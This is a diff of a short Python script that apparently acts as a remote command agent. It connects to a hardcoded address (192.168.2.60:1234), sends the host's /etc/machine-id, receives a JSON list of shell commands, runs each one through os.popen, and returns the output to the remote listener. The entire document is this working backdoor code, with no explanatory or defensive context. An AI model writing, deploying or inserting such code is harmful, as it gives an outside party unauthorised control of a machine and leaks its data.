@@ -1,18 +1,25 @@
-
-
-
 import socket
-import subprocess
 import os
+import json
 
-ipAddr = '192.168.2.58'
+infoSend={}
+ipAddr = '192.168.2.60'
 port = 1234
+data = ""
+cmdOut = {}
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ipAddr, port))
-srvMsg = s.recv(1024).decode()
-cmdOut = os.popen(srvMsg).read()
 f = open("/etc/machine-id", "r")
-cmdId = (f.read()).strip() 
-infoSend = str(cmdId) + "-:-" + str(cmdOut)
-s.send(infoSend.encode())
-cmdOut = os.popen(srvMsg).read() 
+cmdId = (f.read()).strip()
+s.send(cmdId.encode())
+### machine id is sent, now we listen for instructions
+srvMsg = s.recv(1024).decode()
+taskList = json.loads(srvMsg)
+for task in taskList:
+    if task == 'Quit':
+        break
+    cmdOut[task] = (os.popen(task).read())
+    
+data = json.dumps(cmdOut)
+s.send(data.encode())
+
